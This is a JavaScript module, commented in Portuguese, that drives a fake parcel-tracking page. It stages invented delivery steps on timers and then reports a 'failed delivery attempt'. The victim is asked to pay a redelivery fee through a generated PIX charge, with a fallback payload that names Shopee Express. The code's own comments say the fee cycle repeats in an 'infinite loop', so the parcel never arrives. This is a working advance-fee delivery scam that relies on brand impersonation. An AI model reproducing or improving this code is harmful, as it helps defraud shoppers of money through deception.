/**
 * Sistema de fluxo pós-pagamento da taxa alfandegária
 * VERSÃO LIMPA - SEM SIMULADORES DE TESTE
 */
export class PostPaymentSystem {
    constructor(trackingSystem) {
        this.trackingSystem = trackingSystem;
        this.deliveryAttempts = 0;
        this.deliveryValues = [7.74, 12.38, 16.46]; // Valores das tentativas atualizados
        this.isProcessing = false;
        this.timers = [];
        this.currentStep = 0;
        this.deliveryPixData = null;
        
        console.log('🚀 Sistema de fluxo pós-pagamento inicializado');
        console.log('💰 Valores de tentativa:', this.deliveryValues);
    }

    // Iniciar fluxo pós-pagamento após liberação alfandegária
    startPostPaymentFlow() {
        console.log('🚀 Iniciando fluxo pós-pagamento...');

        // Etapa 1: Liberado na alfândega
        this.addTimelineStep({
            stepNumber: 1,
            title: 'Pedido liberado na alfândega de importação',
            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
            delay: 0,
            nextStepDelay: 2 * 60 * 60 * 1000 // 2 horas para próxima etapa
        });
        
        // Etapa 2: Pedido sairá para entrega (após 2 horas)
        this.addTimelineStep({
            stepNumber: 2,
            title: 'Pedido sairá para entrega',
            description: 'Pedido sairá para entrega para seu endereço',
            delay: 2 * 60 * 60 * 1000, // 2 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 3: Pedido em trânsito (após 2.5 horas)
        this.addTimelineStep({
            stepNumber: 3,
            title: 'Pedido em trânsito',
            description: 'Pedido em trânsito para seu endereço',
            delay: 2 * 60 * 60 * 1000 + 30 * 60 * 1000, // 2.5 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 4: Pedido em rota de entrega (após 3 horas)
        this.addTimelineStep({
            stepNumber: 4,
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 3 * 60 * 60 * 1000, // 3 horas
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
        
        // Etapa 5: Tentativa de entrega (após 3.5 horas)
        this.addTimelineStep({
            stepNumber: 5,
            title: 'Tentativa de entrega',
            description: `${this.deliveryAttempts + 1}ª tentativa de entrega realizada, mas não foi possível entregar`,
            delay: 3 * 60 * 60 * 1000 + 30 * 60 * 1000, // 3.5 horas
            isDeliveryAttempt: true,
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
    }
    

    // Adicionar nova etapa na timeline
    addTimelineStep({ stepNumber, title, description, delay, nextStepDelay, isDeliveryAttempt = false }) {
        const timer = setTimeout(() => {
            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
            
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;

            const stepDate = new Date();
            const timelineItem = this.createTimelineItem({
                stepNumber,
                title,
                description,
                date: stepDate,
                completed: true,
                isDeliveryAttempt,
                nextStepDelay
            });

            timeline.appendChild(timelineItem);

            // Animar entrada da nova etapa
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, 100);

            // Scroll para a nova etapa
            timelineItem.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });

            this.currentStep = stepNumber;

        }, delay);

        this.timers.push(timer);
    }

    // Criar item da timeline
    createTimelineItem({ stepNumber, title, description, date, completed, isDeliveryAttempt }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        if (isDeliveryAttempt) {
            // Botão de reenvio com visual igual ao "Liberar Objeto"
            buttonHtml = `
                <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${this.deliveryAttempts}">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        if (isDeliveryAttempt) {
            const retryButton = item.querySelector('.delivery-retry-btn');
            if (retryButton) {
                this.configureDeliveryRetryButton(retryButton);
            }
        }

        return item;
    }

    // Configurar botão de reenvio com visual igual ao "Liberar Objeto"
    configureDeliveryRetryButton(button) {
        // Aplicar o mesmo estilo do botão "Liberar Objeto"
        button.style.cssText = `
            background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
            animation: pulse 2s infinite;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
            margin-top: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        `;

        button.addEventListener('click', () => {
            this.handleDeliveryRetry(button);
        });

        console.log('🔄 Botão de reenvio configurado');
    }

    // Lidar com reenvio - GERAR PIX FUNCIONAL
    async handleDeliveryRetry(button) {
        if (this.isProcessing) return;

        this.isProcessing = true;
        const attemptNumber = parseInt(button.dataset.attempt);
        const value = this.deliveryValues[attemptNumber % this.deliveryValues.length];
        
        console.log(`🔄 Processando reenvio - Tentativa ${attemptNumber + 1} - R$ ${value.toFixed(2)}`);

        // Mostrar loading
        this.showDeliveryLoadingNotification();

        try {
            // Gerar PIX funcional via Zentra Pay
            console.log('🚀 Gerando PIX para tentativa de entrega via Zentra Pay...');
            
            const pixResult = await this.trackingSystem.zentraPayService.createPixTransaction(
                this.trackingSystem.userData, 
                value
            );

            if (pixResult.success) {
                console.log('🎉 PIX de reenvio gerado com sucesso!');
                this.deliveryPixData = pixResult;
                
                this.closeDeliveryLoadingNotification();
                
                // Mostrar modal de pagamento de reenvio
                setTimeout(() => {
                    this.showDeliveryPixModal(value, attemptNumber + 1);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX de reenvio');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX de reenvio:', error);
            this.closeDeliveryLoadingNotification();
            
            // Mostrar modal estático como fallback
            setTimeout(() => {
                this.showDeliveryPixModal(value, attemptNumber + 1, true);
            }, 300);
        }
    }

    showDeliveryLoadingNotification() {
        const notification = document.createElement('div');
        notification.id = 'deliveryLoadingNotification';
        notification.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const content = document.createElement('div');
        content.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `;

        content.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reenvio...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `;

        notification.appendChild(content);
        document.body.appendChild(notification);
        document.body.style.overflow = 'hidden';
    }

    closeDeliveryLoadingNotification() {
        const notification = document.getElementById('deliveryLoadingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    // Modal de PIX para tentativa de entrega
    showDeliveryPixModal(value, attemptNumber, isStatic = false) {
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryPixModal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        // QR Code e PIX Payload
        let qrCodeSrc, pixPayload;
        
        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
            // Dados reais do Zentra Pay
            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
            pixPayload = this.deliveryPixData.pixPayload;
            console.log('✅ Usando PIX real do Zentra Pay para reenvio');
        } else {
            // Fallback estático
            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            console.log('⚠️ Usando PIX estático como fallback para reenvio');
        }

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        this.setupDeliveryModalEvents(modal, attemptNumber);

        console.log(`💳 Modal de PIX para ${attemptNumber}° tentativa exibido - R$ ${value.toFixed(2)}`);
    }

    setupDeliveryModalEvents(modal, attemptNumber) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryPixModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryPixModal();
            });
        }

        // Botão copiar PIX
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryPixModal();
            }
        });
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX de reenvio copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX de reenvio:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX de reenvio copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    closeDeliveryPixModal() {
        const modal = document.getElementById('deliveryPixModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
        this.isProcessing = false;
    }

    // Processar reenvio após pagamento
    processDeliveryRetry(attemptNumber) {
        // Ocultar botão de reenvio atual
        this.hideCurrentRetryButton(attemptNumber - 1);

        // Incrementar contador de tentativas
        this.deliveryAttempts = attemptNumber;
        
        // Se for a 4ª tentativa, voltar para a 1ª (loop infinito)
        if (this.deliveryAttempts >= 3) {
            this.deliveryAttempts = 0;
        }

        console.log(`✅ Reenvio ${this.deliveryAttempts} processado com sucesso`);
        console.log(`💰 Próximo valor será: R$ ${this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length].toFixed(2)}`);

        // Reiniciar fluxo de entrega
        setTimeout(() => {
            this.startDeliveryFlow();
        }, 2000);
    }
    
    // Ocultar botão de reenvio atual
    hideCurrentRetryButton(attemptNumber) {
        const currentRetryButton = document.querySelector(`[data-attempt="${attemptNumber}"]`);
        if (currentRetryButton) {
            currentRetryButton.closest('.timeline-item').style.display = 'none';
        }
    }

    // Iniciar novo fluxo de entrega
    startDeliveryFlow() {
        console.log('🚚 Iniciando novo fluxo de entrega...');

        this.isProcessing = false;

        // Resetar contador de etapas para o fluxo de reenvio
        const baseStep = 100 + (this.deliveryAttempts * 10); // 110, 120, 130, etc.

        // Etapa 1: Sairá para entrega
        this.addTimelineStep({
            stepNumber: baseStep + 1,
            title: 'Pedido sairá para entrega',
            description: 'Seu pedido está sendo preparado para nova tentativa de entrega',
            delay: 0,
            nextStepDelay: 30 * 60 * 1000 // 30 minutos
        });
    }

    // Verificar se é horário útil (8h às 18h, segunda a sexta)
    isBusinessHour(date) {
        const hour = date.getHours();
        const day = date.getDay(); // 0 = domingo, 6 = sábado
        
        return day >= 1 && day <= 5 && hour >= 8 && hour < 18;
    }

    // Obter próximo horário útil
    getNextBusinessTime(date) {
        const next = new Date(date);
        
        // Se for fim de semana, ir para segunda-feira
        if (next.getDay() === 0) { // Domingo
            next.setDate(next.getDate() + 1);
        } else if (next.getDay() === 6) { // Sábado
            next.setDate(next.getDate() + 2);
        }
        
        // Se for após 18h, ir para próximo dia útil às 8h
        if (next.getHours() >= 18) {
            next.setDate(next.getDate() + 1);
            next.setHours(8, 0, 0, 0);
        } else if (next.getHours() < 8) {
            next.setHours(8, 0, 0, 0);
        }
        
        return next;
    }

    // Limpar todos os timers
    clearAllTimers() {
        this.timers.forEach(timer => clearTimeout(timer));
        this.timers = [];
        console.log('🧹 Todos os timers foram limpos');
    }

    // Resetar sistema
    reset() {
        this.clearAllTimers();
        this.deliveryAttempts = 0;
        this.isProcessing = false;
        this.currentStep = 0;
        this.deliveryPixData = null;
        
        // Fechar modais se abertos
        this.closeDeliveryPixModal();

        console.log('🔄 Sistema resetado');
    }

    // Obter status atual do sistema
    getStatus() {
        return {
            deliveryAttempts: this.deliveryAttempts,
            isProcessing: this.isProcessing,
            currentStep: this.currentStep,
            activeTimers: this.timers.length,
            currentDeliveryValue: this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length],
            deliveryValues: this.deliveryValues,
            hasDeliveryPixData: !!this.deliveryPixData
        };
    }
}